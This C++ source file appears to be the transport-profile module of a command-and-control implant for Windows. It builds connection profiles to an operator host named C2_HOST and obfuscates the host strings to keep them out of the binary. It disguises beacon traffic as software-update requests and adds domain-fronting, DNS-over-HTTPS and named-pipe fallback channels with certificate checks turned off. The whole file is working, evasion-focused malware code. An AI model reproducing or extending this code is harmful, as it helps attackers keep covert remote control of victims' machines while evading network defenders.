#include "Profile.h"
#include "DohTransport.h"
#include "FrontTransport.h"
#include "HttpsTransport.h"
#include "PipeTransport.h"
#include "Malleable.h"
#include "core/Config.h"
#include "evasive/Strings.h"

#include <windows.h>

#include <cstdio>
#include <cstring>
#include <memory>
#include <random>
#include <string>

namespace tx {

namespace {

struct ProfileEntry {
    std::unique_ptr<Profile> p;
    bool enabled;
    int fails;
};

std::vector<ProfileEntry> g_profiles;
std::size_t g_active = 0;
int g_fallback_after = 3;

void parse_json_field(std::string_view json, std::string_view key, std::string& out) {
    std::string pat = "\"" + std::string(key) + "\"";
    auto k = json.find(pat);
    if (k == std::string::npos) return;
    auto q1 = json.find('"', k + pat.size() + 1);
    if (q1 == std::string::npos) return;
    auto q2 = json.find('"', q1 + 1);
    if (q2 == std::string::npos) return;
    out.assign(json.substr(q1 + 1, q2 - q1 - 1));
}

bool parse_json_bool(std::string_view json, std::string_view key, bool& out) {
    std::string pat = "\"" + std::string(key) + "\"";
    auto k = json.find(pat);
    if (k == std::string::npos) return false;
    auto c = json.find_first_of("tf", k + pat.size());
    if (c == std::string::npos) return false;
    out = json[c] == 't';
    return true;
}

bool parse_json_uint(std::string_view json, std::string_view key, std::uint16_t& out) {
    std::string pat = "\"" + std::string(key) + "\"";
    auto k = json.find(pat);
    if (k == std::string::npos) return false;
    auto c = json.find_first_of("0123456789", k + pat.size());
    if (c == std::string::npos) return false;
    out = static_cast<std::uint16_t>(std::atoi(json.data() + c));
    return out != 0;
}

const char* malleable_text =
    "set useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n"
    "http-get {\n"
    "  uri \"/updates/check\"\n"
    "  header \"Accept\" \"application/json\"\n"
    "  block parameter \"id\"\n"
    "  block base64\n"
    "}\n"
    "http-post {\n"
    "  uri \"/updates/submit\"\n"
    "  header \"Accept\" \"application/json\"\n"
    "  block parameter \"data\"\n"
    "  block base64url\n"
    "}\n";
// Host is filled from C2_HOST at parse time below — not embedded here.
} // namespace

bool init() {
    // Build profile JSON from OBF pieces so host/paths stay out of .rdata.
    auto host = OBF_KEEP(C2_HOST);
    auto name_https = OBF_KEEP("https");
    auto name_redir = OBF_KEEP("redirector");
    auto scheme_http = OBF_KEEP("http");
    auto scheme_https = OBF_KEEP("https");
    auto k_profiles = OBF_KEEP("{\"profiles\":[");
    auto k_fallback = OBF_KEEP("],\"fallback_after_failures\":3}");

    char primary[384];
    std::snprintf(primary, sizeof(primary),
        "{\"name\":\"%s\",\"enabled\":true,\"host\":\"%s\",\"port\":%d,"
        "\"scheme\":\"%s\",\"ignore_cert\":true}",
        name_https.c_str(), host.c_str(), static_cast<int>(C2_PORT),
        scheme_http.c_str());

    char redir[384];
    std::snprintf(redir, sizeof(redir),
        ",{\"name\":\"%s\",\"enabled\":false,\"host\":\"%s\",\"port\":443,"
        "\"scheme\":\"%s\",\"ignore_cert\":true}",
        name_redir.c_str(), host.c_str(), scheme_https.c_str());

    std::string json = std::string(k_profiles.c_str()) + primary + redir + k_fallback.c_str();

#ifdef C2_EXTRA_PROFILES
    {
        char front_buf[384];
        std::snprintf(front_buf, sizeof(front_buf),
            ",{\"name\":\"front\",\"enabled\":false,\"cdn\":\"cdn.example.com\",\"port\":443,"
            "\"front\":\"legit-cdn.com\",\"real\":\"%s\",\"ignore_cert\":true}"
            ",{\"name\":\"doh\",\"enabled\":false,\"resolver\":\"https://cloudflare-dns.com/dns-query\","
            "\"type\":\"TXT\",\"ignore_cert\":true}"
            ",{\"name\":\"pipe\",\"enabled\":false,\"host\":\".\",\"pipename\":\"pipe\\\\c2_session\"}",
            host.c_str());
        json.insert(json.size() - std::strlen(k_fallback.c_str()), front_buf);
    }
#endif

    std::string_view jv(json);
    size_t pos = 0;
    malleable::Profile mp;
    malleable::parse(malleable_text, mp);
    {
        auto h = OBF_KEEP(C2_HOST);
        mp.host = h.c_str();
    }

    while ((pos = jv.find("{\"name\":", pos)) != std::string::npos) {
        auto end = jv.find("}", pos);
        if (end == std::string::npos) break;
        std::string_view block = jv.substr(pos, end - pos + 1);
        std::string name, host, scheme, ua, resolver, type, pipename, cdn, front, real;
        parse_json_field(block, "name", name);
        parse_json_field(block, "host", host);
        parse_json_field(block, "scheme", scheme);
        parse_json_field(block, "user_agent", ua);
        parse_json_field(block, "resolver", resolver);
        parse_json_field(block, "type", type);
        parse_json_field(block, "pipename", pipename);
        parse_json_field(block, "cdn", cdn);
        parse_json_field(block, "front", front);
        parse_json_field(block, "real", real);
        bool enabled = false; parse_json_bool(block, "enabled", enabled);
        bool ignore_cert = false; parse_json_bool(block, "ignore_cert", ignore_cert);
        std::uint16_t port_n = 8443;
        parse_json_uint(block, "port", port_n);

        ProfileEntry e;
        if (name == "https" || name == "redirector") {
            bool use_tls = (scheme != "http");
            e.p = std::make_unique<HttpsTransport>(host, port_n,
                ignore_cert, mp, use_tls);
        } else if (name == "front") {
            e.p = std::make_unique<FrontTransport>(cdn, port_n,
                front, real, ignore_cert, mp);
        } else if (name == "doh") {
            e.p = std::make_unique<DohTransport>(resolver, type, ignore_cert);
        } else if (name == "pipe") {
            e.p = std::make_unique<PipeTransport>(host, pipename);
        }
        e.enabled = enabled && e.p != nullptr;
        e.fails = 0;
        if (e.p) g_profiles.push_back(std::move(e));
        pos = end + 1;
    }
    if (g_profiles.empty()) return false;
    g_active = 0;
    return true;
}

Profile* active() {
    for (std::size_t i = 0; i < g_profiles.size(); ++i) {
        std::size_t idx = (g_active + i) % g_profiles.size();
        if (g_profiles[idx].enabled && g_profiles[idx].fails < g_fallback_after) {
            g_active = idx;
            return g_profiles[idx].p.get();
        }
        g_profiles[idx].fails = 0;
    }
    g_active = 0;
    return g_profiles.empty() ? nullptr : g_profiles[0].p.get();
}

void report_failure() {
    if (g_active < g_profiles.size()) ++g_profiles[g_active].fails;
}

void report_success() {
    if (g_active < g_profiles.size()) g_profiles[g_active].fails = 0;
}

std::size_t profile_count() { return g_profiles.size(); }

Profile* profile_at(std::size_t i) {
    return i < g_profiles.size() ? g_profiles[i].p.get() : nullptr;
}

} // namespace tx
